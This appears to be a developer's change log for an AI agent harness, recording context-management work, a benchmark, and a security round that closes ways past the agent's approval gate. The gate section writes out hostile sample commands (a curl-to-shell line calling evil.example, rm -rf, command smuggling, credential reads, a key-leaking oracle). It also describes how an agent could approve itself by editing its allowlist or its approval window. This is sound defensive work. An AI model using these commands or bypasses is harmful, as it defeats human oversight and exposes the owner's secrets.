  fixed, and now covered by the `context.py` test suite that this file had been
  claiming existed. Worth internalizing: it lived in a code path that *only*
  executes past 60k tokens, so every short test in the repo ran straight past
  it. Long-horizon code needs long-horizon tests.
- **The working plan** (`tools/plan.py`). One tool, `plan_write`, holding a
  markdown checklist rewritten whole each time. It renders into `messages[0]`,
  which nothing in `context.py` touches, so it is the one part of a long run
  that cannot be pruned away — and it is re-rendered every *step*, not every
  turn. The skills index proved the mechanism; this reuses it. Wired into the
  main agent (all tools), workflows, and the designer.
- **Sub-agents** (`tools/subagent.py`). `delegate()` was the cost lever; this
  is the *context* lever, which is a different problem. Every tool result a run
  produces lives in the orchestrator's transcript forever — fetch four pages to
  answer one question and 40k tokens of page dump outlive the answer by the
  whole session. `run_subagent` does the job on its own transcript and returns
  only its final text. Safety in "Safety design"; it is synchronous, which is
  what lets it hold the browser when a background workflow cannot.

Not done, in the order I would do them next (the full list came out of a review
on 2026-08-01; **spill-don't-drop truncation and real `prompt_tokens` were done
2026-08-09**, and **step-budget awareness plus a resumable handoff 2026-08-12**
— see *Harness round 2* below and *Hitting the wall is survivable* above):
repetition detection (the gpt-oss-20b vocab-bench
failure — 16 rounds of no valid action — is invisible to the loop today);
durable workflow journals; and ~~**`long-bench`**~~ — **done 2026-08-15**, see
*long-bench* below. Repetition detection is the last one that matters, and
long-bench now reports a `redundant_calls` count, so the signal exists before
the loop acts on it.

**Harness round 2 (2026-08-09) — the gaps a Claude Code comparison exposed.**
Six defects, all found by reading Jarvis's loop against a harness built for the
same job, all fixed together. All 42 free suites pass. (`tests/browser/
audio_check.py` matches the `*_check.py` glob but is **not** one — it opens the
HUD window and serves until Ctrl-C, so it hangs a sweep by design.)

- **There was no edit primitive.** `write_file` took the whole file, so changing
  three lines in a long one cost the model the entire file — and models drop
  content when re-emitting at length, which the read-before-write stamp cannot
  catch (it detects *staleness*, never *truncation*). `edit_file` does anchored
  replacement: exact match, unique unless `replace_all`, refuses ambiguity
  rather than guessing. **It honours SELF_PROTECTED, and that is the part to
  never lose** — a one-line replacement in `permissions.py` disarms the gate as
  thoroughly as overwriting it and looks like far less, so any future write
  tool has to be added to `self_improve_check.py` too.
- **`read_file` was capped at 40k characters with no way to ask for the rest.**
  CLAUDE.md is 116KB, so `skills/self-improve.md`'s first instruction ("read
  CLAUDE.md first") had been reading 34% of the file and reporting no problem.
  Reads are paged now (`offset`/`limit`, footer names where to resume) and
  line-numbered. The numbering has a matching hazard in each direction, and
  both are handled: `edit_file` retries once with the prefixes stripped when a
  quoted excerpt fails to match, and `write_file` strips them when a whole-file
  rewrite carries them back in — the strip only fires on read_file's own
  6-wide right-aligned field, so a TSV counting 1, 2, 3 survives.
- **Search was unbounded.** `run_readonly` allows grep but forbids pipes, so
  there was no `| head`: the model took the whole dump and it lived in the
  transcript forever. `grep_files` bounds its own output (`mode` =
  content/files/count, `max_results`, glob, context lines), ripgrep with a
  pure-Python fallback that the suite exercises by forcing it. It lives in
  `tools/search.py` rather than `files.py` on purpose — SELF_PROTECTED exists
  to freeze the *write* guard, and freezing a read-only search tool beside it
  buys nothing.
- **Tool calls ran one at a time.** Invariant 3 exists to keep models emitting
  parallel calls, and the loop then executed them serially — so the only thing
  parallelism bought was fewer round trips. Now consecutive parallel-safe calls
  run together (measured: 3×0.3s tools in 0.30s). See invariants 3 and 8 for
  the two things that make it safe: call-order results, and one fresh
  `copy_context()` per worker.
- **`finish_reason` was captured and never read.** `llm.Reply` has carried it
  since the beginning; nothing in the codebase looked at it, so a reply the
  provider cut off at `max_tokens` was appended and returned as the finished
  answer — a sentence stopping mid-word, indistinguishable from a completed
  one. This is the **same bug as the invisible step budget**, and the third
  time that shape has appeared: *a state the harness can produce that the model
  cannot see is a state the model will confabulate around.* The loop now flags
  it (`Turn.truncated`), continues up to `MAX_CONTINUATIONS` times joining the
  halves, and says `[cut off at the token limit]` if it still cannot finish. A
  cut that landed mid-tool-call gets a note **after** the results, never
  before — invariant 3 again. `max_tokens` also went 4096 → 8192
  (`config.MAX_TOKENS`): 4096 is ~16k characters, which any substantial
  whole-file write exceeded.
- **Compaction was judged on chars÷4.** The estimate counts no tool schemas at
  all, so it reads low by thousands on a full toolset and the threshold did not
  mean what it said. `context.TokenMeter` keeps the provider's real
  `prompt_tokens` for the measured prefix and estimates only what was appended
  since — measured immediately after `llm.chat` returns, when `self.messages`
  is still exactly the request. Every measurement is provisional, so
  `discount()` covers in-place rewrites (eviction, truncation) and
  `invalidate()` covers compaction, which deletes messages the measurement
  counted and has no honest adjustment.
- **Truncation was the one context operation with no way back.** Eviction
  leaves a placeholder, compaction leaves a summary; a cut result left nothing,
  so a page fetched at step 4 was gone by step 20. It now spills the full body
  to `config.SPILL_DIR` (content-hashed, so identical results share a file and
  re-truncating is idempotent) and leaves a `read_file`-able pointer. The
  pointer goes *before* the `TRUNCATED` marker, because that suffix is how the
  next pass recognises its own work. A spill that cannot be written degrades to
  a plain cut — it is a bonus, never a reason for a turn to fail.

**Follow-ups closed 2026-08-10**, each one a smaller version of a lesson
already in this file:

- **A compaction summary that overran was silently cut.** `_summarize` had its
  own `max_tokens` and never looked at `finish_reason` — the exact bug the loop
  had just been fixed for, one function away. It matters more here than
  anywhere else: the summary *becomes the record*, and the sections it loses
  are the last ones, which is where OPEN and FILES live. It now re-asks once,
  much tighter, and if that still overruns it says so inside the summary.
- **The goal dollar ceiling is checked mid-turn.** It was checked only between
  slices, which assumed a slice costs roughly one slice. `run_fleet` broke that
  (six children, each with its own step budget, inside one turn) but the
  assumption was always thin — a 40-step turn that goes in circles overspends
  the same way, slower. `Agent` emits an `on_event("cost", …)` per step and the
  goal runner sets its interrupt, so the turn ends whole at the next step
  boundary and the existing between-slices check parks it.
- **`chmod`/`chown` narrowed.** Still allowed for ordinary work, but a
  credential directory (`~/.ssh`, `.gnupg`, `.aws`, the jarvis config dir) or a
  world-writable mode falls to ASK. ssh *fails closed* on loose permissions, so
  the damage shows up later and somewhere else.
- **Two honesty corrections.** `command_review`'s docstring now states the
  TOCTOU gap plainly — it fetches the URL and then `curl` fetches it again, so
  the review describes *a* script from that URL, not necessarily the one that
  runs; that is why a trusted host is also required. And `rules.py` no longer
  implies DENY is a boundary: it is token matching over a shell line, `rm -rf
  "/"` falls through to ASK, and the real boundary is still filesystem
  permissions.

Also: `run_subagent` was pinned to the orchestrator tier **by omission** (it
constructed its child with no `model`), now `config.TIERS["subagent"]`,
defaulting to the same model so behaviour is unchanged but movable.

Deliberately **not** done in this round, because they are decisions rather than
defects and are the owner's to make:

- ~~Permission rule matchers.~~ **Done 2026-08-09** — see *Command rules* in
  Safety design. Still not done: **hooks**, i.e. running the owner's own
  programs at PreToolUse/PostToolUse. The rules engine covers the cases hooks
  were wanted for here; a general hook runner is a bigger idea and wants its
  own conversation.
- ~~A typed sub-agent fleet.~~ **Done 2026-08-09** — see *Sub-agents are typed*
  in Safety design. The known blocker was handled rather than dodged: the
  browser type is `concurrent_safe=False`, so the fleet serialises exactly the
  children that share the Playwright singleton and runs everything else
  together.
- ~~Moving the durable slot off `messages[0]`.~~ **Done 2026-08-09** — see
  invariant 7. The volatile blocks ride a rebuilt-every-step block at the tail
  now, so a `plan_write` no longer invalidates the whole prefix cache.

**Gate round 3 (2026-08-17) — seven ways past the approval gate, all fixed
together.** A security pass found them; every one was confirmed by execution
against the real code before anything was changed, and every regression case
added here was verified to **fail** against the unfixed source before being
kept. All 47 free suites pass afterwards. The unifying shape is worth more than
any single fix: **each was a second, older copy of an idea that `rules.py`
already had right.** Two implementations of "where does one command end" drift,
and the more permissive copy is the one that decides.

- **The allowlist was one word wide** (`permissions.py`) — the worst of them.
  `allows()` matched `command.split()[0]`, one first word for the entire line,
  and `gate()` returned True on that *before* the surface approver was ever
  called. So a single owner-created `{"tool": "run_command", "prefix": "git"}`
  — the entry you get by answering ALWAYS to one `git status` — made

      git status && rm -rf ~/projects
      git status; curl http://evil.example/x.sh | sh

  run with **no CLI prompt, no HUD card and no Discord DM**, on every surface,
  goal runs included, and past the fetch-execute reviewer as well. rules.py had
  judged every segment with worst-verdict-wins since the day it shipped; the
  allowlist beside it was still reading one token. It now asks
  `rules.command_stems()` and requires **all** stems to be covered — an
  allowlist entry must never authorise a segment the owner did not allowlist.

  What kept it from being total, and is worth knowing because it is the design
  working: **DENY was unreachable this way.** `dispatch()` evaluates
  `permissions.command_verdict()` *before* calling the approver, so `git status
  && sudo rm -rf /` was still refused outright. The secrets layer also still
  won, and background workflows were untouched (`workflows.py` passes a bare
  `_deny`, never `permissions.gate`). The hole was exactly the ASK verdict —
  which is the gate.

  Second half of the same bug: `entry_for()` only attached a prefix when the
  command was non-empty, so a **whitespace-only** `run_command` — which the
  schema accepts, since `required` only rejects an *absent* key — produced a
  prefix-less `{"tool": "run_command"}`, and `allows()` read `prefix is None`
  as "the whole tool". One ALWAYS press permanently widened the gate from one
  stem to every command, with nothing in the JSON to say so. `entry_for` now
  raises `NotAllowlistable` for that and for compound commands (one click must
  not mint a blanket grant per stem that happened to share the line), and a
  prefix-less command entry authorises nothing however it got there. Raising
  rather than returning None is deliberate: `ApprovalBroker.resolve` already
  treats a failing on_always hook as "the approval stands, but this is not an
  *always*", so the decision log stays honest with no edit to the
  SELF_PROTECTED broker.

- **Nothing froze the gate's data** (`tools/files.py`). SELF_PROTECTED freezes
  the gate's *code*; `_self_protected()` decided by `relative_to(REPO_ROOT)`
  and returned False on ValueError, so everything outside the checkout was
  unprotected **by construction** — and `config.ALLOWLIST_PATH` is
  deliberately outside it. `allowlist.json` is not a credential name, so
  secrets.py did not cover it; neither write tool is `dangerous`. So
  `read_file` (satisfying read-before-write) plus one ungated `edit_file`
  wrote `[{"tool": "run_command"}]`, `load_allowlist()` re-reads on every
  check, and the very next dangerous call was auto-approved — every surface,
  no restart, nobody asked, and afterwards indistinguishable from an entry the
  owner created. Both write tools are in `workflows.SAFE_TOOLS` and
  `SUBAGENT_TOOLS`, so a background workflow that cannot run a dangerous tool
  *itself* could unlock the owner's surfaces.

  The fix keys on the **identity of the file** — a resolved-path check in
  `_self_protected`, which both write tools already call — rather than on its
  position relative to the repo. Not by adding the name to
  `secrets.PROTECTED_NAMES`: it is not a credential, it must stay *readable*
  (the owner and the HUD both inspect it), and borrowing the credential
  refusal would tell the model something untrue about why. It is read from
  `config` per call, so a suite that repoints `ALLOWLIST_PATH` at a temp file
  protects the temp file. Still reachable by an *approved* `run_command`,
  which is the same deliberate exception SELF_PROTECTED already makes.

  Generalises: **freezing the code that reads a decision is not freezing the
  decision.** Any future gate that persists state needs its state named here
  the day it is added.

- **`grep_files` returned credential files through ripgrep** (`tools/search.py`).
  The filter was `is_protected(ln.split(":", 1)[0])` — the first
  colon-delimited field of an output *line* — which recognises exactly one of
  rg's output shapes. Three escaped: **context lines** are attributed with `-`,
  not `:`, so `context_lines>0` returned every non-matching line of a bundle in
  the window; given a **single file** as `path` rg prints no filename at all,
  so the field tested was a line number and `grep_files('KEY', '.env')`
  returned the file verbatim at the default `context_lines=0`; and **count**
  mode on a single file emits a bare number, turning a protected file into a
  match oracle (`^OPENROUTER_API_KEY=sk-or-v1-F` answers 1 or 0, one character
  at a time) that `dispatch()`'s value-scrub cannot touch because no secret
  value is ever in the output. The pure-Python fallback had none of them — it
  filters whole *files* before reading them — so this is the gitignore bug
  again: **two backends, two answers, decided by which binaries are installed.**

  Fixed by giving rg `--null --with-filename`, so the path is always present
  and is separated by a byte no path can contain, then filtering per file and
  re-rendering the fallback's exact shapes. A record that cannot be attributed
  to a file is dropped: this is a credential filter, so "unrecognised" has to
  mean "withheld".

- **`run_readonly` had two ways to run a second command** (`tools/shell.py`),
  and it is `dangerous=False` — no rule, no approval, no allowlist entry — so
  its operator denylist is the *entire* boundary. A bare **newline** and a bare
  **`&`** were both missing: `run_readonly("ls\ntouch PWNED")` returned
  `[exit 0]` and the file was there. `rules.segments()` had always known
  newlines separate commands; this hand-copied version of the same idea did
  not. `<` joined the list because input redirection also glues a filename to a
  binary (`cat<.env`). And the tool now judges the command **after
  `rules.unwrap()`**, because `env` is on its allowlist and `env -C /tmp sh -c
  'cat .env'` was therefore a "read-only" call that printed a live credential.

  Its git guard was also a denylist of seven writing subcommands, so `git rm`,
  `git mv`, `git restore`, `git pull`, `git stash`, `git apply`,
  `git cherry-pick`, `git revert`, `git gc` and `git config --global` all ran
  unattended (verified: `git rm -f f.txt` deleted the file). It is an
  allowlist now, with a listing-form rule for the dual-mode subcommands —
  `git branch` and `git branch -a` read, `git branch -D x` does not.

- **`rules.segments()` did not split on a bare `&`** — so `ls & rm -rf ~/work`
  was *one* segment, the `rm` was read as arguments to `ls`, and the line was
  ALLOW. That is the module's headline invariant failing on the cheapest
  possible spelling, and an ALLOW at a human-backed surface is auto-approved.
  The split is now **quote-aware**, which it had to become in the same change:
  splitting the raw string on `&` drags `git commit -m 'fix A & B'` into an
  approval prompt, and the same flaw was already there for `;` and `|`, just
  rarer. **A fix that makes ordinary work ask is a different bug, not a smaller
  one.** Unbalanced quotes fall back to the naive split, which over-segments.

- **Two rules were defeated by deleting a space**, both because shlex merges an
  operator or flag into its operand. `echo pwned>~/.bashrc` splits into
  `['echo', 'pwned>~/.bashrc']`, so the token test saw no redirect and the
  2026-08-10 fix for `echo pwned > ~/.bashrc` was reachable again; the redirect
  scan now reads the raw segment with quote state. And `python -c"import os"`
  splits into `['python', '-cimport os']`, so the exact-token test saw no `-c`
  — the rule whose whole purpose is that allowing the stem must not allow the
  language was allowing the language.

- **`secrets.protected_in_command` and `_drop_attributed_lines` shared a
  parser gap.** Layer 2 treated every shlex token as a path and took its
  basename, so `cat<.env`, `sh -c 'cat .env'`, `env sh -c 'cat .env'`,
  `python -c "open('.env')"`, `F=.env; cat $F` and `cat $(echo .env)` were all
  invisible; the raw line is scanned too now, with boundaries that keep
  `.env.example` and `.envrc` readable. Layer 3 — the scrub at `dispatch()`,
  the one CLAUDE.md calls the one that matters — understood only `path:...`
  and `==> path <==`, so grep's **context** attribution `path-N-text` walked a
  `.env` straight past it, silently, with the "[N line(s) … withheld]" counter
  still printing so the output looked filtered. `-`, tab and NUL are
  understood now; `:` is still tried first so a path containing a `-` is not
  cut short.

  The accepted cost, recorded because it is a real trade: layer 2 now refuses
  `git commit -m "ignore .env"` for naming a file it only mentions. That is
  the deliberate direction — a refusal the model can rephrase past is cheaper
  than a credential in the transcript, which is only fixable by rotating a key.

- **`uiatree.forbidden_title()` was narrower than what it backstops**
  (`windows/uiatree.py`). It was exact string equality while `bridge.py`
  resolves a registered app's window by *substring*, so any window-manager
  suffix defeated it: `forbidden_title("J.A.R.V.I.S.")` was True and
  `forbidden_title("J.A.R.V.I.S. - Google Chrome")` was False — the HUD opened
  in an ordinary browser tab rather than app mode was attachable, and an agent
  that can drive the window holding the authorization card can approve itself.
  Substring now. Nothing pinned the literals to reality either, so renaming
  either page's `<title>` silently disarmed the check;
  `tests/desktop_check.py` reads both `<title>` tags out of the real HTML now,
  the same drift guard `hud_avatar_check` applies to `WAKE_PATTERNS`. Still
  mitigated in practice by `DESKTOP_APPS` registering no browser.

**Narrowing that round (2026-08-17, same day).** An adversarial pass over the
fixes above found four places where they were too broad, and this project's own
rule is that **a fix that makes ordinary work ask is a different bug, not a
smaller one** — a boundary that refuses ordinary work does not get respected,
it gets routed around, and an owner asked to approve `git stash list` learns to
approve without reading. All four were narrowed without reopening anything; the
evidence is a before/after verdict table over a 3,747-command corpus, in which
**every** difference is one of these four and nothing moved in the strict
direction except two holes deliberately closed (below).

- **`2>&1` prompted.** Detail and edges in *Command rules* above. Headline:
  the redirect check was a raw scan for `>`, which is a larger set than
  "writes to a path".
- **`run_readonly` refused ten pure git reads.** `git branch --contains HEAD`,
  `git branch --list 'feat*'`, `git tag -l 'v*'`, `git remote get-url origin`,
  `git config --get user.name`, `git worktree list`, `git submodule status`,
  `git stash list`, `git bisect log`, `git notes list`. Two causes: the
  listing rule demanded that **every** remaining token start with `-`, so any
  read carrying a *value* was refused; and `bisect` was in neither set. The
  subcommands are now split by *how* they say "read" — `GIT_SUBSUB_READS` for
  the ones that dispatch again (`remote get-url`, `worktree list`),
  `GIT_CONFIG_READ_FLAGS` for `config` (which writes by simply being given a
  name and a value, so the *absence* of a reading flag is what refuses it),
  and a positional-count rule for `branch`/`tag`, where a leftover positional
  is a name to create unless `-l`/`--list` turned positionals into patterns.
  Every writing form is still refused, including two the widening could
  plausibly have swept up: **bare `git stash` is `git stash push`**, the one
  member of that family where doing nothing writes, and **`-a` is `--all` for
  `git branch` but `--annotate` for `git tag`**, so treating it as a listing
  flag would have made tag creation look like a read.
- **`run_readonly`'s operator check was not quote-aware**, unlike the
  `segments()` it was written beside — so `grep 'a&b' f.txt` and `git log
  --grep='fix & bug'` errored. It reuses `rules.first_unquoted()` now rather
  than carrying a second hand-written copy of the idea, **which was the actual
  defect**: one idea in two files is how the two files disagreed. `$(` and
  backticks are scanned with `double_is_quote=False`, because a double quote
  is not protection from something the shell expands right through it.
- **Full-path allowlist entries were dead.** See *Permission modes* above.

**And the one this narrowing broke, caught by a differential sweep rather than
by a test.** Making the operator scan escape-aware was *correct* — the shell
does not treat `\;` as a separator either — but `find` is on `run_readonly`'s
allowlist, so `find . -exec rm -rf {} \;` went REFUSED → RAN. It had only ever
been refused **by accident**, as a raw `;` in an operator scan, and the moment
the accident stopped happening there was nothing behind it. Worse, the sweep
showed `find / -delete` and `find . -exec rm {} +` carry no separator at all
and had been running unattended the whole time. `run_readonly` now asks
`rules.writes_anyway()` — the same list `rules.py` already used to pull
`find`/`sed` back to ASK — so the writing forms are refused by name and flag,
where it belongs, and the reading forms still run. Two lessons: **a guard that
only works as a side effect of another guard is not a guard**, and a
loosening deserves a differential sweep, because the thing it un-blocks is by
definition something no existing test was asserting.

**And the second one it broke — the same shape, one layer down, found by an
independent adversarial pass and fixed 2026-08-17.** The shared scanner's
`double_is_quote=False` was implemented as *"treat `"` as an ordinary
character"*, which is not what it means. A `'` inside a double-quoted string is
an apostrophe, but that spelling let it open a single-quote region that ran to
the end of the line — so the `$(…)` sitting behind it was never scanned, and

    run_readonly("grep \"it's $(touch /tmp/PWNED)\" f")
    run_readonly("echo \"don't `touch /tmp/PWNED`\"")

**both executed, verified live**, creating the file and returning `[exit 0]`.
That is arbitrary code execution through a `dangerous=False`, ungated tool that
background workflows and goal runs hold — precisely the hole the same day's
`ls\ntouch PWNED` fix had closed, reopened by the fix for that fix's
over-reach. The committed pre-round code caught it, because a dumb
`"$(" in command` substring scan has no quoting model to get wrong.

`unquoted_indices()` now always tracks **both** quote kinds with real nesting
(a `'` inside `"…"` is text, a `"` inside `'…'` is text), and `double_is_quote`
decides only whether the *contents* of a double-quoted run are reported —
never whether `"` still delimits one. `grep "it's ; ok" f` still runs, because
that `;` genuinely is inside double quotes.

The lesson is the one `_READONLY` already taught, one level more general:
**a scanner is only correct together with the quoting rules it models**, and
replacing a crude check with a modelled one trades a false-positive problem for
a false-*negative* one. The crude version fails loudly and annoyingly; the
modelled version fails silently and permissively. So every narrowing of a
security scan needs its exploit re-run, not just its friction case — the
regression cases live at the end of `READONLY_MUST_REFUSE` in
`tests/rules_check.py`, alongside direct `first_unquoted` assertions, and are
verified to fail against the intermediate version.

**long-bench shipped (2026-08-15)** — `longbench/`, the ruler the *Not done*
list had been asking for since 2026-08-01. It is the first bench here that
**does not import Jarvis**: a task is a pure `plan(seed, scale)`, a
`materialize` that writes a directory, a prompt (plus optional follow-up turns),
and a grader that reads the directory back — so anything that can be handed a
prompt and a working directory can be measured: the Jarvis loop, `claude -p`, or
a person with an editor. That is what makes a cross-harness comparison possible,
and it is why the code lives outside `jarvis/`. Three tasks: `sweep` (a 166-site
migration across 422 files, then the spec changes), `audit` (483 files,
precision *and* recall against 238 planted violations), `thread` (a shard chain
with a cohort rule, a salt, and two truncated files recoverable only from a
`.bak`). Six categories: completeness, retention, discipline, recovery,
interference, correctness. Design, parity gaps and baselines in
`longbench/README.md`.

Four design rules, in increasing order of how much they cost to learn:

- **Ground truth is recomputed from the seed, never written to disk.** `plan` is
  pure, so the grader regenerates the answer at grading time. A bench that
  stores its answer key in the workspace measures reading comprehension.
- **Checks carry floats, not booleans.** agent-bench's checks are
  all-or-nothing, which is fine for the properties it tests; for a bench about
  *completeness*, "31 of 44 sites" and "0 of 44" scoring the same would throw
  away the measurement.
- **The rock passed the safety check three more times.** `sweep` shipped with
  "every edited module still parses" — an *untouched* module parses fine, so a
  do-nothing run collected 3 free points. Then "no reference to the old API
  left", which a **deleted** file satisfies perfectly. Then, a rewrite later,
  both *interference* checks: an agent that migrates nothing also never obeys
  the stale document it never read. All are conjunctive with having done the
  work now, and the suite caught each one on its first run — which is the whole
  argument for writing the empty-run assertion before the graders.
- **Every escape hatch is symmetric or it is a handicap.** The levers that
  remove shell (`--no-shell`) and set the compaction threshold (`--window`) move
  on **both** harnesses — Claude Code's `--autocompact` and Jarvis's
  `ContextPolicy.compact_at_tokens` — and the CLI refuses a window below
  Claude Code's 100k floor rather than quietly giving the two sides different
  numbers. Mode, window and scale are recorded on every run record and printed
  in the row label, because pooling runs from different configurations is the
  easiest way to publish a wrong number.

**The v1 bench saturated, and the diagnosis is the lesson.** At its first sizing
Luna scored 100% on all three tasks for $0.107 total. Two escape hatches, both
found only by running it: Haiku scored 100% on `thread` in **eight tool calls**
by writing a shell script (forty shards, none of which entered a context
window), and Luna scored 100% on `audit` in 21 calls with `grep_files`. But the
real defect was cruder — **the worlds were ~20x too small for compaction to ever
fire**, so the bench measured task success while claiming to measure context
management. Generalises past this bench: **a long-horizon test has to be
calibrated against the window it is meant to overflow, not against how long it
feels to write.**

The constraint that shapes every task here:

> Any task with mechanically-detectable ground truth can be solved by search,
> and any task whose ground truth is not mechanical cannot be graded
> deterministically.

Two ways out, both now used. `sweep` resists structurally, because **edits
cannot be grepped** — search finds the call sites, but each file still has to be
read and rewritten. `audit` resists by making its secret rule **cross-file**: a
literal secret is exempt if that service's `handler.py` signs it off, which one
grep cannot answer.

**Baseline at scale 4 (seed 1, `--no-shell --window 100000`): Luna scored 95% on
`sweep`** — $1.70, 32.5 min, 203 turns, 882 tool calls (95 repeated). Perfect
completeness (166/166 sites migrated and 166/166 tagged by the follow-up turn),
correctness, discipline and interference. **The single miss is the one worth
having built the bench for:** the changelog entry says 156 call sites when the
true count is 166 — a number derived in the middle of a 32-minute run, carried
to the last file written, and off by ten. No other bench here can see that
class of error.

Two operational lessons from the same run:

- **Do not grade mid-run.** A snapshot at ~17 minutes scored 48%, with 41 of 88
  modules unparseable: the first pass had rewritten `legacy_emit(` to
  `emit(name=` textually, which puts a positional argument after a keyword one.
  Luna found and fixed every one before finishing, and had also gone back to
  migrate both packages the stale `NOTES.md` calls frozen (0/19 sites at the
  snapshot, 19/19 at the end). An in-flight score measures a state the agent has
  not finished being in.
- **The Claude Code cell is the expensive one by a wide margin.** On `thread` at
  scale 1, Claude Code with *Haiku* cost 38x what Jarvis with Luna did ($0.2275
  vs $0.0060), and Sonnet 5 is dearer per token than Haiku. Always pass
  `--budget`; calibrate at `--scale 2` before committing to a full scale-4
  sweep.

`redundant_calls` (95 of 882 here, ~11%) is the repetition signal the *Not done*
list wants the loop to act on. The measurement now exists; the loop still does
nothing with it.

**Attended background tasks shipped (2026-08-20)** — the conversation agent
stays a responsive chat thread and hands real work to background "task" agents
whose approvals reach the owner. Details and safety reasoning in *Safety
design* ("Attended background tasks can ask"); mechanics: `tasks.py` (the
workflows.py shape with the captured approver and a `cancel` Event),
`tools/tasks.py` (task_start / task_status / task_log / task_cancel — the
start tool captures `runtime.approver()`), `runtime.origin()` (the
attribution ContextVar the broker reads at request time), an origin line on
the HUD card and the Discord DM, task lifecycle SSE (`tasks.set_notify`, the
face broadcasts it into the OPERATIONS ticker), and a `## Background tasks`
section in the working-context block for task-armed agents — the
confabulation lesson applied: task status the surface can see is status the
transcript must carry too. Decisions made with the owner, recorded so they
are not relitigated: **tasks inherit the foreground gate whole** (allowlist +
ALLOW rules auto-run off-screen; wrapping the approver to force asks would
both strip the human-backed flag and teach approve-without-reading), and
**both verbs stay** — `task_start` is the default background delegation,
`workflow_start` the never-interrupt variant (agent-bench's `orchestrate`
pins its own toolset, so its multiagent rating is unaffected). The delegation
policy lives in the `config.py` system prompt: inline for
quick/conversational/interactive work, `task_start` for self-contained jobs
with a clear deliverable, `run_subagent` when the answer is needed before
replying, `workflow_start` only when the owner must not be pinged.
`tests/tasks_check.py` is the free suite (16 suites re-run green after the
change, including every approval, workflow, goal, daemon and HUD suite).

**Spotify shipped (2026-08-21) — and with it, deferred tool groups.** Ten tools
(`tools/spotify.py`): `spotify_play` (a plain-words query, an exact URI, or a
list of them; resumes when called bare), `spotify_status`, `spotify_search`,
`spotify_playlists`, `spotify_pause`, `spotify_skip`, `spotify_queue`,
`spotify_settings` (volume/shuffle/repeat), `spotify_library` (liked, top,
recent) and `spotify_artist_tracks`. Setup, credential handling and the two
confinements are in *Safety design* above; `jarvis auth spotify` with no
argument prints the whole dashboard walkthrough.

Four API facts this is built around, each checked against Spotify's current
documentation rather than remembered, because three of them are places a
reasonable guess is wrong:

- **The redirect URI must be `http://127.0.0.1:8406/callback`, literally.**
  Spotify requires HTTPS except for a loopback address and **rejects the
  spelling `localhost`** outright. The port is therefore fixed rather than
  ephemeral like the Google flow's, because the owner registers this exact
  string by hand.
- **Playback control is Premium-only.** Every `/me/player/*` write 403s on a
  free account, so `_fail` names the plan — a bare "403 Forbidden" reads as a
  Jarvis bug and sends the owner to the wrong place entirely.
- **Spotify's recommendation endpoints are gone for new apps.**
  `/recommendations`, `/related-artists`, `/audio-features` and the editorial
  playlist endpoints were retired on 2024-11-27 for apps registered after that
  date, which ours is; they 403 with no deprecation notice. So "play something
  like X" is `spotify_artist_tracks` blended with the owner's own top and saved
  tracks, and the tool text says that is what it is rather than passing it off
  as Spotify's recommender. Tutorials still reference the old endpoints because
  pre-2024 apps kept access.
- **A device must exist before anything can play**, and a freshly-launched
  client takes seconds to register with Spotify Connect. `_pick_device` launches
  and polls rather than returning an error the owner has to act on, and names
  the device it chose, because "playing on the desktop because your phone was
  the only other option" otherwise reads as picking at random.

**The tool-group mechanism is the more reusable half** (invariant 10). Ten more
tools would have cost ~1,318 tokens of JSON schema on *every* request forever —
11% of a registry that already weighs ~11k before anything is said. It now
costs 0 when Spotify was never connected, 525 when it is, and the full 1,318
only in a conversation that actually turned into one about music. Nothing else
uses groups yet; `gmail`, `onshape`/`cad_*` and `desktop_*` are the obvious
candidates and are left alone until someone measures whether the round trip is
worth it for them.

**Reasoning effort is set explicitly, and clamped per model (2026-08-22).**
Luna's own default effort is **medium**; the orchestrator now asks for `max`
(`config.REASONING_EFFORT`, env `JARVIS_REASONING_EFFORT`, `""`/`default` hands
the decision back to the provider). The orchestrator is the call that plans,
picks tools and recovers from errors — the one place in this system where a
better answer is worth more than a faster one.

Three things decide how it behaves, and each was checked against the live API
rather than assumed:

- **Scope is the agent loop, not every call.** `llm.chat` sends nothing unless
  a caller passes `effort=`, and the only caller that does is `run_turn` (plus
  the exhaustion handoff). The cheap and worker tiers do bulk text nobody
  reasons about — measured on gpt-oss-20b, asking for effort at all took a
  5-token completion to 80 — so `delegate("…", tier="cheap")` stays untouched.
  Sub-agents inherit it for free, because they are Agents.
- **The ladder is not the same on every model**, so `models.effort_for()`
  clamps to what the model publishes in `reasoning.supported_efforts`: Luna
  goes to `max`, gpt-oss-20b stops at `high`, and a model with no reasoning
  block gets nothing at all rather than a parameter that reads as though it did
  something. It reads the **already-cached** catalog and never fetches —
  `cached_info()` exists precisely so a model call cannot block on the catalog
  endpoint to find out how hard to think.
- **A cold cache still thinks hard.** An effort a model does not publish is
  accepted and clamped upstream, not refused — verified live: `max` on
  gpt-oss-20b returned 200 and spent *fewer* reasoning tokens than `high` did.
  So an unknown model gets the requested effort rather than none, because
  thinking less because a cache is cold is the worse failure. A *typo* is the
  opposite case and is dropped with a one-time warning, since a garbage enum
  value is the shape that could 400 every request for the rest of the run.

**Effort is settable per model, from the picker (2026-08-23).** Each roster row
carries a control listing that model's *own* advertised levels, plus AUTO —
which names what the global default resolves to on that model, because on a
model whose ladder stops short of `max` those are different numbers. The pin
lives in `models.json` beside the roster and beats `config.REASONING_EFFORT`;
AUTO clears it, which is the way out of any choice made there.

Three rules, each the opposite of what a global default does:

- **A pin is refused off-ladder rather than clamped.** Clamping is right when a
  global default meets a model that cannot reach it; this is a choice made
  about one named model, and storing something other than what was asked would
  leave the picker showing a level nobody selected.
- **A model with no reasoning control cannot be pinned at all**, and gets no
  control drawn. Storing a pin `effort_for` would then ignore is the worst of
  both.
- **A pin does not outlive its model.** Removing a model drops its override, so
  re-adding it later starts from the default rather than resurrecting a setting
  the owner made once, months ago.

**BYOK routing is automatic, and it broke every dollar budget (found and fixed
2026-08-23).** The owner added a Moonshot key to OpenRouter and asked whether
requests route to it. They do, with no code change — verified live on
`moonshotai/kimi-k3`: `is_byok: true`. But the same response carried `cost: 0`,
because `usage.cost` is what OpenRouter billed **to your credits**, and a BYOK
call spends on the provider account instead. `llm.Reply.cost_usd` read that
field directly, so on a BYOK model the goal runner's dollar ceiling (which
parks a runaway goal on *spend*), the HUD's SESSION COST and every bench cost
column would all have read zero while real money moved — a goal could only ever
park on slices or hours.

`llm._cost()` now takes `max(usage.cost, cost_details.upstream_inference_cost)`.
A **max, not a sum**, and the measurement is the reason: on a credit-billed call
the two fields are *the same number* (Luna: both 9e-06), so adding them would
double count; on a BYOK call they are 0 and the real figure (kimi-k3: 0 and
0.0006264). Generalises past this one field — **a number that arrives as zero
is not the same as a number that is zero**, and every ceiling in this system is
denominated in the one that was wrong.

